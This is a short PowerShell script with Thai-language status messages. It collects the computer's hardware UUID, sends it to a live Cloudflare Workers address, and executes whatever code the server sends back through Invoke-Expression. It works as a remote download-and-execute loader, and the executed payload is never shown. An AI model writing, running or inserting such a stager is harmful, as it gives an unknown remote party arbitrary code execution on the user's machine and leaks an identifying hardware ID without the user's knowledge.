[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[Console]::OutputEncoding = [Text.Encoding]::UTF8

$hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
$body = @{ hwid = $hwid } | ConvertTo-Json

Write-Host "กำลังเชื่อมต่อกับเซิร์ฟเวอร์..." -ForegroundColor Cyan

try {
    $response = Invoke-RestMethod -Uri "https://flat-art-959b.rov170652.workers.dev" `
        -Method Post -Body $body -ContentType "application/json" -TimeoutSec 20
    Write-Host "เชื่อมต่อสำเร็จ!" -ForegroundColor Green
    Invoke-Expression $response
} catch {
    Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Yellow
    if ($_.Exception.Response) {
        $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
        Write-Host "Worker: $($reader.ReadToEnd())" -ForegroundColor Magenta
    } else {
        Write-Host "ไม่ได้รับการตอบกลับจากเซิร์ฟเวอร์ (ปัญหาเครือข่าย/TLS)" -ForegroundColor Red
    }
}
